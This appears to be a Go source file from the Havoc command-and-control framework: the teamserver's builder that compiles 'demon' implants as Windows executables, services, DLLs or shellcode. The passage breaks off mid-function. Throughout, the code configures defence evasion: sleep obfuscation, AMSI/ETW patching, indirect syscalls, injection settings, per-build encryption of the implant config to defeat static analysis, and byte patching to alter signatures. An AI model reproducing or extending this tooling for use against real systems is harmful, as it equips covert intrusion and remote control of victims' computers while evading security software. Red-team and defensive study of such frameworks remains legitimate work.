package builder

import (
	"bytes"
	"crypto/rand"

	//"encoding/hex"
	"encoding/json"
	"errors"
	"fmt"
	"os"
	"os/exec"
	"path"
	"path/filepath"
	"strconv"
	"strings"

	"Havoc/pkg/agent"
	"Havoc/pkg/common"
	"Havoc/pkg/common/crypt"
	"Havoc/pkg/common/packer"
	"Havoc/pkg/handlers"
	"Havoc/pkg/logger"
	"Havoc/pkg/profile"
	"Havoc/pkg/utils"
	"Havoc/pkg/win32"
)

// TODO: move to agent package
const (
	PayloadDir  = "payloads"
	PayloadName = "demon"
)

const (
	FILETYPE_WINDOWS_EXE            = 1
	FILETYPE_WINDOWS_SERVICE_EXE    = 2
	FILETYPE_WINDOWS_DLL            = 3
	FILETYPE_WINDOWS_REFLECTIVE_DLL = 4
	FILETYPE_WINDOWS_RAW_BINARY     = 5
)

const (
	SLEEPOBF_NO_OBF  = 0
	SLEEPOBF_EKKO    = 1
	SLEEPOBF_ZILEAN  = 2
	SLEEPOBF_FOLIAGE = 3
)

const (
	SLEEPOBF_BYPASS_NONE   = 0
	SLEEPOBF_BYPASS_JMPRAX = 1
	SLEEPOBF_BYPASS_JMPRBX = 2
)

const (
	PROXYLOADING_NONE             = 0
	PROXYLOADING_RTLREGISTERWAIT  = 1
	PROXYLOADING_RTLCREATETIMER   = 2
	PROXYLOADING_RTLQUEUEWORKITEM = 3
)

const (
	AMSIETW_PATCH_NONE   = 0
	AMSIETW_PATCH_HWBP   = 1
	AMSIETW_PATCH_MEMORY = 2
)

const (
	ARCHITECTURE_X64 = 1
	ARCHITECTURE_X86 = 2
)

type BuilderConfig struct {
	Compiler64 string
	Compiler86 string
	Nasm       string
	// DebugDev: compile demon with `-DDEBUG -DDEBUG_NOSTDLIB`, console-subsystem
	// EXE, no libc/libgcc. Debug output via the existing LogToConsole helper
	// (dynamically resolved Win32.vsnprintf + WriteConsoleA). Binary gets a
	// "debug" trailer appended so operators can identify it with `tail -c 16`.
	DebugDev bool
	SendLogs bool
}

type Builder struct {
	buildSource bool
	sourcePath  string
	silent      bool

	Payloads []string

	FilesCreated []string

	CompileDir     string
	FileExtenstion string

	FileType int
	ClientId string

	PatchBinary bool

	ProfileConfig struct {
		Original any

		MagicMzX64 string
		MagicMzX86 string

		ImageSizeX64 int
		ImageSizeX86 int

		ReplaceStringsX64 map[string]string
		ReplaceStringsX86 map[string]string
	}

	config struct {
		Arch           int
		ListenerType   int
		ListenerConfig any
		Config         map[string]any
	}

	ImplantOptions struct {
		Config []byte
	}

	compilerOptions struct {
		Config BuilderConfig

		SourceDirs  []string
		IncludeDirs []string
		CFlags      []string
		Defines     []string

		Main struct {
			Demon string
			Dll   string
			Exe   string
			Svc   string
		}
	}

	outputPath string
	preBytes   []byte

	// [HVC-005 2026-03-28] BCRYPT_RSAPUBLIC_BLOB embedded as SERVER_PUBKEY_BLOB.
	rsaPublicKeyBlob []byte

	// testCmdRunner is non-nil only in tests.  When set, Cmd() delegates to it
	// instead of exec.Command so tests can capture / fake the compile command
	// without requiring a real cross-compiler.  The function receives the full
	// shell command string and returns (success, stderr).
	testCmdRunner func(cmd string) (bool, string)

	// innerBuilderSetup is non-nil only in tests.  For FILETYPE_WINDOWS_RAW_BINARY
	// the inner DLL builder is created inside Build(); this hook is called on that
	// builder before its Build() runs, allowing tests to inject testCmdRunner and
	// capture state (e.g. rsaPublicKeyBlob propagation).
	innerBuilderSetup func(inner *Builder)

	SendConsoleMessage func(MsgType, Message string)
}

func NewBuilder(config BuilderConfig) *Builder {
	var builder = new(Builder)

	builder.sourcePath = utils.GetTeamserverPath() + "/" + PayloadDir + "/Demon"
	builder.config.Arch = ARCHITECTURE_X64

	builder.compilerOptions.SourceDirs = []string{
		"src/core",
		"src/crypt",
		"src/inject",
		"src/asm",
	}

	builder.compilerOptions.IncludeDirs = []string{
		"include",
	}

	/*
	 * -Os                             Optimize for space rather than speed.
	 * -fno-asynchronous-unwind-tables Suppresses the generation of static unwind tables (as opposed to complete exception-handling code).
	 * -masm=intel                     Use the intel assembler dialect
	 * -fno-ident                      Ignore the #ident directive.
	 * -fpack-struct=<number>          Set initial maximum structure member alignment.
	 * -falign-functions=<number>      Align the start of functions to the next power-of-two greater than or equal to n, skipping up to m-1 bytes.
	 * -s                              Remove all symbols
	 * -ffunction-sections             Place each function into its own section.
	 * -fdata-sections                 Place each global or static variable into .data.variable_name, .rodata.variable_name or .bss.variable_name.
	 * -falign-jumps=<number>          Align branch targets to a power-of-two boundary.
	 * -w                              Suppress warnings.
	 * -falign-labels=<number>         Align all branch targets to a power-of-two boundary.
	 * -fPIC                           Generate position-independent code if possible (large mode).
	 * -Wl                             passes a comma-separated list of tokens as a space-separated list of arguments to the linker.
	 * -s                              Remove all symbol table and relocation information from the executable.
	 * --no-seh                        Image does not use SEH.
	 * --enable-stdcall-fixup          Link _sym to _sym@nn without warnings.
	 * --gc-sections                   Decides which input sections are used by examining symbols and relocations.
	 */

	logger.Debug(fmt.Sprintf("Payload Builder: DebugDev=%v", config.DebugDev))

	// Production / debug-strings-only: identical CFlags. -nostdlib will be added
	// below in either case (no libc, no libgcc). DebugDev differs only by
	// adding -DDEBUG and -DDEBUG_NOSTDLIB (see below), so PRINTF/PUTS route
	// through the LogToConsole helper which uses Instance->Win32.vsnprintf +
	// WriteConsoleA — no libc dependency.
	builder.compilerOptions.CFlags = []string{
		"",
		"-Os -fno-asynchronous-unwind-tables -masm=intel",
		"-fno-ident -fpack-struct=8 -falign-functions=1",
		"-s -ffunction-sections -fdata-sections -falign-jumps=1 -w",
		"-falign-labels=1 -fPIC",
		"-Wl,-s,--no-seh,--enable-stdcall-fixup,--gc-sections",
	}

	builder.compilerOptions.Main.Dll = "src/main/MainDll.c"
	builder.compilerOptions.Main.Exe = "src/main/MainExe.c"
	builder.compilerOptions.Main.Svc = "src/main/MainSvc.c"

	builder.compilerOptions.Config = config

	builder.PatchBinary = false

	return builder
}

func (b *Builder) SetSilent(silent bool) {
	b.silent = silent
}

func (b *Builder) Build() bool {
	var (
		CompileCommand string
		AsmObj         string
	)

	b.CompileDir = "/tmp/" + utils.GenerateID(10) + "/"
	err := os.Mkdir(b.CompileDir, os.ModePerm)
	if err != nil {
		logger.Error("Failed to create compile directory: " + err.Error())
		return false
	}

	if b.outputPath == "" && b.FileExtenstion != "" {
		b.SetOutputPath(b.CompileDir + PayloadName + b.FileExtenstion)
	}

	if b.config.ListenerType == handlers.LISTENER_EXTERNAL {
		b.SendConsoleMessage("Error", "External listeners are not support for payload build")
		b.SendConsoleMessage("Error", "Use SMB listener")
		return false
	}

	if !b.silent {
		b.SendConsoleMessage("Info", "Starting Build")
		if b.compilerOptions.Config.DebugDev {
			b.SendConsoleMessage("Info", "================================================================")
			b.SendConsoleMessage("Info", "  DEBUG BUILD (--debug-dev)")
			b.SendConsoleMessage("Info", "  - PE subsystem : CONSOLE (debug logs print to cmd.exe)")
			b.SendConsoleMessage("Info", "  - linkage      : -nostdlib (no libc, no libgcc)")
			b.SendConsoleMessage("Info", "  - debug output : LogToConsole (dynamic vsnprintf+WriteConsoleA)")
			b.SendConsoleMessage("Info", "  - file trailer : binary appended with 'debug' marker")
			b.SendConsoleMessage("Info", "  - DO NOT ship  : intended for analysis runs only")
			b.SendConsoleMessage("Info", "================================================================")
		}
	}

	Config, err := b.PatchConfig()
	if err != nil {
		b.SendConsoleMessage("Error", err.Error())
		return false
	}

	if !b.silent {
		b.SendConsoleMessage("Info", fmt.Sprintf("Config Size [%v bytes]", len(Config)))
	}

	// [HVC-014 2026-04-28] Encrypt the embedded config with AES-256-CTR.
	// Goal: defeat trivial static analysis (xxd / strings) of the demon binary.
	// Listener URLs, headers, user-agent, pivot pipe names etc. are all in
	// `Config`; previously embedded as plaintext bytes via -DCONFIG_BYTES.
	// Now: a fresh random 32-byte key + 16-byte IV are generated per build,
	// the config is encrypted, and three defines are emitted:
	//   CONFIG_BYTES = ciphertext (same length as plaintext — CTR is a stream cipher)
	//   CONFIG_KEY   = 32 raw key bytes
	//   CONFIG_IV    = 16 raw IV bytes
	// The demon decrypts in-place at the top of DemonConfig() before parsing.
	cfgKey := make([]byte, 32)
	cfgIV := make([]byte, 16)
	if _, randErr := rand.Read(cfgKey); randErr != nil {
		logger.Error("HVC-014: failed to generate config AES key: " + randErr.Error())
		return false
	}
	if _, randErr := rand.Read(cfgIV); randErr != nil {
		logger.Error("HVC-014: failed to generate config AES IV: " + randErr.Error())
		return false
	}
	encryptedConfig := crypt.XCryptBytesAES256(Config, cfgKey, cfgIV)
	if len(encryptedConfig) != len(Config) {
		logger.Error(fmt.Sprintf("HVC-014: AES-CTR length mismatch: in=%d out=%d",
			len(Config), len(encryptedConfig)))
		return false
	}
	logger.Debug(fmt.Sprintf("HVC-014: config encrypted, %d plaintext bytes -> %d ciphertext bytes",
		len(Config), len(encryptedConfig)))

	// Helper to format a byte slice as a C array initializer "{0xAA\,0xBB\,...}"
	// (the backslash-comma escape is required by the shell command line).
	formatByteArray := func(b []byte) string {
		out := "{"
		for i, v := range b {
			if i == len(b)-1 {
				out += fmt.Sprintf("0x%02x", v)
			} else {
				out += fmt.Sprintf("0x%02x\\,", v)
			}
		}
		out += "}"
		return out
	}

	b.compilerOptions.Defines = append(b.compilerOptions.Defines, "CONFIG_BYTES="+formatByteArray(encryptedConfig))
	b.compilerOptions.Defines = append(b.compilerOptions.Defines, "CONFIG_KEY="+formatByteArray(cfgKey))
	b.compilerOptions.Defines = append(b.compilerOptions.Defines, "CONFIG_IV="+formatByteArray(cfgIV))

	// [HVC-005 2026-03-28] Embed the RSA-2048 public key blob as SERVER_PUBKEY_BLOB.
	if len(b.rsaPublicKeyBlob) > 0 {
		pubArray := "{"
		for i, byt := range b.rsaPublicKeyBlob {
			if i == len(b.rsaPublicKeyBlob)-1 {
				pubArray += fmt.Sprintf("0x%02x", byt)
			} else {
				pubArray += fmt.Sprintf("0x%02x\\,", byt)
			}
		}
		pubArray += "}"
		b.compilerOptions.Defines = append(b.compilerOptions.Defines, "SERVER_PUBKEY_BLOB="+pubArray)
	}

	// [HVC-003 + profile-driven seed] Propagate the active HeaderMaskSeed to the
	// Demon at compile time. This MUST match the teamserver's runtime
	// agent.HeaderMaskSeed value so wire-format obfuscation round-trips.
	// Defines.h has a `#ifndef HEADER_MASK_SEED` guard, so this -D overrides
	// the header default. The U suffix forces an unsigned-int literal.
	b.compilerOptions.Defines = append(b.compilerOptions.Defines,
		fmt.Sprintf("HEADER_MASK_SEED=0x%08XU", agent.HeaderMaskSeed))
	logger.Debug(fmt.Sprintf("Builder: HEADER_MASK_SEED define = 0x%08X", agent.HeaderMaskSeed))

	// enable sending debug entries over HTTP(S) to the teamserver
	if b.compilerOptions.Config.SendLogs {
		b.compilerOptions.Defines = append(b.compilerOptions.Defines, "SEND_LOGS")
	}

	// Two modes are supported (the previous --debug-dev mode was removed in
	// HVC-014; it linked libc and produced unstable demons — see
	// Debug-Build-Instability-Analysis.md):
	//   1. DebugDev=true → -DDEBUG, -DDEBUG_NOSTDLIB, no libc. Stable + logs.
	//   2. neither               → no debug defines, no libc. Production.
	//
	// PE subsystem selection:
	//   --debug-strings-only EXE  → -mconsole + -e WinMain.  Running the demon
	//        from cmd.exe automatically connects stdout to the console window,
	//        so PRINTF/PUTS output via LogToConsole appears in the terminal —
	//        same operator UX as the now-removed --debug-dev mode but without
	//        libc. -nostdlib drops mainCRTStartup; -mconsole's default entry
	//        would be `main`, so we pin the entry point to WinMain explicitly.
	//   Service EXE              → -mwindows always (services have no console).
	//   Production / DLL / SHC   → -mwindows. The demon runs invisibly; PRINTF
	//        is stripped to a no-op so there's nothing to print anyway.
	if b.compilerOptions.Config.DebugDev {
		b.compilerOptions.Defines = append(b.compilerOptions.Defines, "DEBUG")
		b.compilerOptions.Defines = append(b.compilerOptions.Defines, "DEBUG_NOSTDLIB")
	}
	if b.FileType == FILETYPE_WINDOWS_SERVICE_EXE {
		b.compilerOptions.CFlags[0] = "-mwindows -ladvapi32"
	} else if b.compilerOptions.Config.DebugDev && b.FileType == FILETYPE_WINDOWS_EXE {
		// EXE only: console subsystem so debug logs print to cmd.exe.
		// `-e WinMain` is added later (line ~449 below) for all EXE builds —
		// no need to repeat it here, doing so would create dual `-e` directives
		// whose precedence is linker-version-dependent.
		b.compilerOptions.CFlags[0] += " -nostdlib -mconsole"
	} else {
		b.compilerOptions.CFlags[0] += " -nostdlib -mwindows"
	}

	// add compiler
	if b.config.Arch == ARCHITECTURE_X64 {
		abs, err := filepath.Abs(b.compilerOptions.Config.Compiler64)

		if err != nil {
			if !b.silent {
				b.SendConsoleMessage("Error", fmt.Sprintf("Failed to resolve x64 compiler path: %v", err))
				return false
			}
		}
		b.compilerOptions.Config.Compiler64 = abs

		CompileCommand += "\"" + b.compilerOptions.Config.Compiler64 + "\" "
	} else {
		abs, err := filepath.Abs(b.compilerOptions.Config.Compiler86)

		if err != nil {
			if !b.silent {
				b.SendConsoleMessage("Error", fmt.Sprintf("Failed to resolve x86 compiler path: %v", err))
				return false
			}
		}
		b.compilerOptions.Config.Compiler86 = abs

		CompileCommand += "\"" + b.compilerOptions.Config.Compiler86 + "\" "
	}

	// add sources
	for _, dir := range b.compilerOptions.SourceDirs {
		files, err := os.ReadDir(b.sourcePath + "/" + dir)
		if err != nil {
			logger.Error(err)
		}

		for _, f := range files {
			var FilePath = dir + "/" + f.Name()

			// only add the assembly if the demon is x64
			if path.Ext(f.Name()) == ".asm" {
				if (strings.Contains(f.Name(), ".x64.") && b.config.Arch == ARCHITECTURE_X64) || (strings.Contains(f.Name(), ".x86.") && b.config.Arch == ARCHITECTURE_X86) {
					AsmObj = b.CompileDir + utils.GenerateID(10) + ".o"
					var AsmCompile string
					if b.config.Arch == ARCHITECTURE_X64 {
						AsmCompile = fmt.Sprintf(b.compilerOptions.Config.Nasm+" -f win64 %s -o %s", FilePath, AsmObj)
					} else {
						AsmCompile = fmt.Sprintf(b.compilerOptions.Config.Nasm+" -f win32 %s -o %s", FilePath, AsmObj)
					}
					logger.Debug(AsmCompile)
					b.FilesCreated = append(b.FilesCreated, AsmObj)
					b.Cmd(AsmCompile)
					CompileCommand += AsmObj + " "
				}
			} else if path.Ext(f.Name()) == ".c" {
				CompileCommand += FilePath + " "
			}
		}
	}
	CompileCommand += "src/Demon.c "

	// add include directories
	for _, dir := range b.compilerOptions.IncludeDirs {
		CompileCommand += "-I" + dir + " "
	}

	// add cflags
	CompileCommand += strings.Join(b.compilerOptions.CFlags, " ")

	// add defines
	b.compilerOptions.Defines = append(b.compilerOptions.Defines, b.GetListenerDefines()...)
	for _, define := range b.compilerOptions.Defines {
		CompileCommand += " -D" + define + " "
	}

	switch b.FileType {
	case FILETYPE_WINDOWS_EXE:
		logger.Debug("Compile exe")
		if b.config.Arch == ARCHITECTURE_X64 {
			CompileCommand += "-D MAIN_THREADED -e WinMain "
		} else {
			CompileCommand += "-D MAIN_THREADED -e _WinMain "
		}
		CompileCommand += b.compilerOptions.Main.Exe + " "
		break

	case FILETYPE_WINDOWS_SERVICE_EXE:
		logger.Debug("Compile Service exe")
		if b.config.Arch == ARCHITECTURE_X64 {
			CompileCommand += "-D MAIN_THREADED -D SVC_EXE -lntdll -e WinMain "
		} else {
			CompileCommand += "-D MAIN_THREADED -D SVC_EXE -lntdll -e _WinMain "
		}
		CompileCommand += b.compilerOptions.Main.Svc + " "
		break

	case FILETYPE_WINDOWS_DLL:
		logger.Debug("Compile dll")
		if b.config.Arch == ARCHITECTURE_X64 {
			CompileCommand += "-shared -e DllMain "
		} else {
			CompileCommand += "-shared -e _DllMain "
		}
		CompileCommand += b.compilerOptions.Main.Dll + " "
		break

	case FILETYPE_WINDOWS_RAW_BINARY:
		logger.Debug("Compile dll and prepend shellcode to it.")

		DllPayload := NewBuilder(b.compilerOptions.Config)
		DllPayload.SetSilent(true)
		DllPayload.ClientId = b.ClientId
		DllPayload.SendConsoleMessage = b.SendConsoleMessage
		DllPayload.config.Config = b.config.Config
		DllPayload.SetArch(b.config.Arch)
		DllPayload.SetFormat(FILETYPE_WINDOWS_DLL)
		DllPayload.SetPatchConfig(b.ProfileConfig.Original)
		DllPayload.SetListener(b.config.ListenerType, b.config.ListenerConfig)
		if b.config.Arch == ARCHITECTURE_X64 {
			DllPayload.SetExtension(".x64.dll")
		} else {
			DllPayload.SetExtension(".x86.dll")
		}
		// [HVC-005] Propagate the RSA public key blob so SERVER_PUBKEY_BLOB is
		// defined when Demon.c is compiled inside the inner DLL build.  Without
		// this, the compiler fails on the unconditional `UCHAR PubKeyBlob[] =
		// SERVER_PUBKEY_BLOB;` line in DemonMetaData(), and Build() returns false.
		DllPayload.SetRSAPublicKey(b.rsaPublicKeyBlob)
		DllPayload.compilerOptions.Defines = append(DllPayload.compilerOptions.Defines, "SHELLCODE")

		if b.innerBuilderSetup != nil {
			b.innerBuilderSetup(DllPayload)
		}
		b.SendConsoleMessage("Info", "Compiling Core DLL...")
		if DllPayload.Build() {

			logger.Debug("Successful Compiled DLL")
			var (
				ShellcodePath   string
				DllPayloadBytes []byte
				Shellcode       []byte
			)

			DllPayloadBytes = DllPayload.GetPayloadBytes()

			DllPayload.DeletePayload()

			b.SendConsoleMessage("Info", fmt.Sprintf("compiled core dll [%v bytes]", len(DllPayloadBytes)))

			if b.config.Arch == ARCHITECTURE_X64 {
				ShellcodePath = utils.GetTeamserverPath() + "/" + PayloadDir + "/Shellcode.x64.bin"
			} else {
				ShellcodePath = utils.GetTeamserverPath() + "/" + PayloadDir + "/Shellcode.x86.bin"
			}

			ShellcodeTemplate, err := os.ReadFile(ShellcodePath)
			if err != nil {
				logger.Error("Couldn't read content of file: " + err.Error())
				b.SendConsoleMessage("Error", "couldn't read content of file: "+err.Error())
				return false
			}

			Shellcode = append(ShellcodeTemplate, DllPayloadBytes...)
			b.SendConsoleMessage("Info", fmt.Sprintf("shellcode payload [%v bytes]", len(Shellcode)))

			b.preBytes = Shellcode

			return true
		}
		// Inner DLL compilation failed.  Return false immediately — do NOT fall
		// through to the outer CompileCmd call below.  The outer command lacks
		// format-specific flags (-shared / -e DllMain), so the linker would try
		// to build a Windows executable, pull in libmingw32.a, and fail with
		// "undefined reference to WinMain" — a confusing symptom that hides the
		// real error (the DLL compile failure printed above).
		return false

	}

	CompileCommand += "-o " + b.outputPath

	if !b.silent {
		b.SendConsoleMessage("Info", "Compiling Source...")
	}

	//logger.Debug(CompileCommand)
	Successful := b.CompileCmd(CompileCommand)

	/* DEBUG strings audit — production safety contract.
	 * When --debug-dev is NOT set, the produced binary must contain ZERO
	 * "[DEBUG::" markers.  The Demon's PRINTF/PUTS/PRINT_HEX macros in
	 * payloads/Demon/include/common/Macros.h strip to do/while(0) no-ops
	 * when DEBUG is undefined, so a leak here means either:
	 *   1. Someone added a direct printf/DbgPrint/DemonPrintf/LogToConsole
	 *      call that bypassed the macros, or
	 *   2. A macro was added without proper #ifdef DEBUG guarding.
	 * Either way, fail the build immediately so the leak cannot ship. */
	if Successful && !b.compilerOptions.Config.DebugDev {
		if err := b.verifyNoDebugStringsInBinary(b.outputPath); err != nil {
			logger.Error("DEBUG strings audit failed: " + err.Error())
			if !b.silent {
				b.SendConsoleMessage("Error", "DEBUG strings audit failed: "+err.Error())
				b.SendConsoleMessage("Error", "rebuild with --debug-dev OR review recent changes to payloads/Demon/")
			}
			return false
		}
	}

	/* DEBUG-BUILD-TRAILER: when --debug-dev is set, append the literal ASCII
	 * string "debug" to the end of the produced binary file. This is a marker
	 * for operators: a single `tail -c 5 demon.exe` (or `xxd | tail`) shows
	 * whether they're holding a debug or production binary, eliminating
	 * accidental ops-time use of a debug build. The trailer sits AFTER the
	 * PE end and is ignored by the Windows loader — runtime behavior unchanged. */
	if Successful && b.compilerOptions.Config.DebugDev {
		if err := b.appendDebugTrailer(b.outputPath); err != nil {
			logger.Error("Failed to append 'debug' trailer: " + err.Error())
			if !b.silent {
				b.SendConsoleMessage("Error", "Failed to append 'debug' trailer: "+err.Error())
			}
			return false
		}
		if !b.silent {
			b.SendConsoleMessage("Info", "DEBUG build complete — 'debug' trailer appended to binary")
		}
	}

	return Successful
}

/* appendDebugTrailer writes the literal ASCII bytes "debug" to the end of
 * the file at `path`. Bytes after the PE end are not part of any section
 * and are ignored by the Windows PE loader at runtime. */
func (b *Builder) appendDebugTrailer(path string) error {
	f, err := os.OpenFile(path, os.O_APPEND|os.O_WRONLY, 0644)
	if err != nil {
		return err
	}
	defer f.Close()
	_, err = f.Write([]byte("debug"))
	return err
}

/* verifyNoDebugStringsInBinary scans the produced Demon binary for the
 * "[DEBUG::" marker that all PRINTF/PUTS macro expansions embed. The
 * marker MUST be absent in production builds. Returns nil if clean,
 * an error describing the leak otherwise. */
func (b *Builder) verifyNoDebugStringsInBinary(path string) error {
	data, err := os.ReadFile(path)
	if err != nil {
		// If the file isn't there, the compile failed earlier — let the
		// caller handle that. This audit is purely a leak check.
		return nil
	}

	const marker = "[DEBUG::"
	if idx := bytes.Index(data, []byte(marker)); idx >= 0 {
		// Capture a small context window for the error message
		end := idx + 64
		if end > len(data) {
			end = len(data)
		}
		ctx := string(data[idx:end])
		// Replace non-printable bytes for the message
		var safe []byte
		for i := 0; i < len(ctx); i++ {
			c := ctx[i]
			if c >= 0x20 && c < 0x7f {
				safe = append(safe, c)
			} else {
				safe = append(safe, '.')
			}
		}
		return fmt.Errorf(
			"Binary at %s contains debug-output marker %q at offset %d (context: %q)",
			path, marker, idx, string(safe),
		)
	}

	logger.Debug(fmt.Sprintf("DEBUG strings audit OK: no %q markers in %s (%d bytes)", marker, path, len(data)))
	return nil
}

func (b *Builder) SetListener(Type int, Config any) {
	b.config.ListenerType = Type
	b.config.ListenerConfig = Config
}

func (b *Builder) SetPatchConfig(Config any) {
	logger.Debug("Set Patch config from Profile")
	if Config != nil {
		b.PatchBinary = true
		b.ProfileConfig.Original = Config
		if Config.(*profile.Binary).Header != nil {
			b.ProfileConfig.MagicMzX64 = Config.(*profile.Binary).Header.MagicMzX64
			b.ProfileConfig.MagicMzX86 = Config.(*profile.Binary).Header.MagicMzX86
			b.ProfileConfig.ImageSizeX64 = Config.(*profile.Binary).Header.ImageSizeX64
			b.ProfileConfig.ImageSizeX86 = Config.(*profile.Binary).Header.ImageSizeX86
		}

		b.ProfileConfig.ReplaceStringsX64 = Config.(*profile.Binary).ReplaceStringsX64
		b.ProfileConfig.ReplaceStringsX86 = Config.(*profile.Binary).ReplaceStringsX86
	}
}

func (b *Builder) SetFormat(Format int) {
	b.FileType = Format
}

func (b *Builder) SetArch(Arch int) {
	b.config.Arch = Arch
}

func (b *Builder) SetConfig(Config string) error {

	err := json.Unmarshal([]byte(Config), &b.config.Config)
	if err != nil {
		logger.Error("Failed to Unmarshal JSON to Object: " + err.Error())
		b.SendConsoleMessage("Error", "Failed to Unmarshal JSON to Object: "+err.Error())
		return err
	}

	return nil
}

func (b *Builder) SetOutputPath(path string) {
	b.outputPath = path
}

func (b *Builder) SetExtension(ext string) {
	b.FileExtenstion = ext
}

// SetRSAPublicKey stores the BCRYPT_RSAPUBLIC_BLOB that will be embedded into
// the payload as the SERVER_PUBKEY_BLOB compiler define. [HVC-005 2026-03-28]
func (b *Builder) SetRSAPublicKey(blob []byte) {
	b.rsaPublicKeyBlob = blob
}

func (b *Builder) GetOutputPath() string {
	return b.outputPath
}

func (b *Builder) Patch(ByteArray []byte) []byte {
	if b.config.Arch == ARCHITECTURE_X64 {
		if b.ProfileConfig.MagicMzX64 != "" {
			for i := range b.ProfileConfig.MagicMzX64 {
				ByteArray[i] = b.ProfileConfig.MagicMzX64[i]
			}
		}

		if b.ProfileConfig.ReplaceStringsX64 != nil {
			for old, _ := range b.ProfileConfig.ReplaceStringsX64 {
				new := []byte(b.ProfileConfig.ReplaceStringsX64[old])
				// make sure they are the same length
				if len(new) < len(old) {
					new = append(new, bytes.Repeat([]byte{0}, len(old)-len(new))...)
				}
				if len(new) > len(old) {
					logger.Error(fmt.Sprintf("Invalid Replacement Rule, New Value (%s) Can Be Longer Than The Old Value (%s)", string(new), old))
				} else {
					ByteArray = bytes.Replace(ByteArray, []byte(old), new, -1)
				}
			}
		}
	} else {
		if b.ProfileConfig.MagicMzX86 != "" {
			for i := range b.ProfileConfig.MagicMzX86 {
				ByteArray[i] = b.ProfileConfig.MagicMzX86[i]
			}
		}

		if b.ProfileConfig.ReplaceStringsX86 != nil {
			for old, _ := range b.ProfileConfig.ReplaceStringsX86 {
				new := []byte(b.ProfileConfig.ReplaceStringsX86[old])
				// make sure they are the same length
				if len(new) < len(old) {
					new = append(new, bytes.Repeat([]byte{0}, len(old)-len(new))...)
				}
				if len(new) > len(old) {
					logger.Error(fmt.Sprintf("Invalid Replacement Rule, New Value (%s) Can Be Longer Than The Old Value (%s)", string(new), old))
				} else {
					ByteArray = bytes.Replace(ByteArray, []byte(old), new, -1)
				}
			}
		}
	}

	return ByteArray
}

func (b *Builder) PatchConfig() ([]byte, error) {
	var (
		DemonConfig        = packer.NewPacker(nil, nil)
		ConfigSleep        int
		ConfigJitter       int
		ConfigAlloc        int
		ConfigExecute      int
		ConfigSpawn64      string
		ConfigSpawn32      string
		ConfigObfTechnique int
		ConfigObfBypass    int
		ConfigProxyLoading  = PROXYLOADING_NONE
		ConfigStackSpoof    = win32.FALSE
		ConfigSyscall       = win32.FALSE
		ConfigAmsiPatch     = AMSIETW_PATCH_NONE
		ConfigAutoProxy     = win32.TRUE  /* [HVC-026] default ON — preserves existing always-on behavior */
		err                 error
	)

	logger.Debug(b.config.Config)

	if val, ok := b.config.Config["Sleep"].(string); ok {
		ConfigSleep, err = strconv.Atoi(val)
		if err != nil {
			if !b.silent {
				b.SendConsoleMessage("Error", "Failed to Convert Sleep String to Int: "+err.Error())
			}
			return nil, err
		}
	}

	if val, ok := b.config.Config["Jitter"].(string); ok {
		ConfigJitter, err = strconv.Atoi(val)
		if err != nil {
			if !b.silent {
				b.SendConsoleMessage("Error", "Failed to Convert Jitter String to Int: "+err.Error())
			}
			return nil, err
		}
		if ConfigJitter < 0 || ConfigJitter > 100 {
			return nil, errors.New("Jitter has to be between 0 and 100")
		}
	} else {
		b.SendConsoleMessage("Info", "Jitter Not Found?")
		ConfigJitter = 0
	}

	if val, ok := b.config.Config["Indirect Syscall"].(bool); ok {
		if val {
			ConfigSyscall = win32.TRUE
			if !b.silent {
				b.SendConsoleMessage("Info", "Indirect Syscalls: Enabled")
			}
		}
	}

	// [HVC-026] Auto Proxy Detection — default TRUE (preserves existing behavior)
	if val, ok := b.config.Config["Auto Proxy Detection"].(bool); ok {
		if val {
			ConfigAutoProxy = win32.TRUE
		} else {
			ConfigAutoProxy = win32.FALSE
		}
	}

	if b.FileType == FILETYPE_WINDOWS_SERVICE_EXE {
		if val, ok := b.config.Config["Service Name"].(string); ok {
			if len(val) > 0 {
				b.compilerOptions.Defines = append(b.compilerOptions.Defines, "SERVICE_NAME=\\\""+val+"\\\"")
				if !b.silent {
					b.SendConsoleMessage("Info", "Set Service Name: "+val)
				}
			} else {
				val = common.RandomString(6)
				b.compilerOptions.Defines = append(b.compilerOptions.Defines, "SERVICE_NAME=\\\""+val+"\\\"")
				if !b.silent {
					b.SendConsoleMessage("Info", "Service Name Not Specified: Using Random Name - "+val)
					b.SendConsoleMessage("Info", "Set Service Name: "+val)
				}
			}
		}
	}

	// Demon Config
	DemonConfig.AddInt(ConfigSleep)
	DemonConfig.AddInt(ConfigJitter)

	if Injection := b.config.Config["Injection"].(map[string]any); len(Injection) > 0 {

		if val, ok := Injection["Alloc"].(string); ok && len(val) > 0 {
			switch val {
			case "Win32":
				ConfigAlloc = 1
				break

			case "Native/Syscall":
				ConfigAlloc = 2
				break

			default:
				ConfigAlloc = 0
				break
			}
		} else {
			return nil, errors.New("Injection Alloc is undefined")
		}

		if val, ok := Injection["Execute"].(string); ok && len(val) > 0 {
			switch val {
			case "Win32":
				ConfigExecute = 1
				break

			case "Native/Syscall":
				ConfigExecute = 2
				break

			default:
				ConfigExecute = 0
				break
			}
		} else {
			return nil, errors.New("Injection Execute is undefined")
		}

		if val, ok := Injection["Spawn64"].(string); ok && len(val) > 0 {
			ConfigSpawn64 = val
		} else {
			return nil, errors.New("Injection Spawn64 is undefined")
		}

		if val, ok := Injection["Spawn32"].(string); ok && len(val) > 0 {
			ConfigSpawn32 = val
		} else {
			return nil, errors.New("injection Spawn32 is undefined")
		}
	} else {
		return nil, errors.New("injection is undefined")
	}

	if val, ok := b.config.Config["Sleep Technique"].(string); ok && len(val) > 0 {
		switch val {
		case "WaitForSingleObjectEx":
			ConfigObfTechnique = SLEEPOBF_NO_OBF
			if !b.silent {
				b.SendConsoleMessage("Info", "Sleep Obfuscation: None")
			}
			break

		case "Foliage":
			ConfigObfTechnique = SLEEPOBF_FOLIAGE
			if !b.silent {
				b.SendConsoleMessage("Info", "Sleep Obfuscation: \"Foliage\"")
			}
			break

		case "Ekko":
			ConfigObfTechnique = SLEEPOBF_EKKO
			if !b.silent {
				b.SendConsoleMessage("Info", "Sleep Obfuscation: \"Ekko\"")
			}
			break

		case "Zilean":
			ConfigObfTechnique = SLEEPOBF_ZILEAN
			if !b.silent {
				b.SendConsoleMessage("Info", "Sleep Obfuscation \"Zilean\"")
			}
			break

		default:
			ConfigObfTechnique = SLEEPOBF_NO_OBF
			if !b.silent {
				b.SendConsoleMessage("Info", "no sleep obfuscation has been specified")
			}
			break
		}

		// compile-time technique selection: only include the chosen obfuscation code
		switch val {
		case "Foliage":
			b.compilerOptions.Defines = append(b.compilerOptions.Defines, "SLEEPOBF_USE_FOLIAGE")
		case "Ekko", "Zilean":
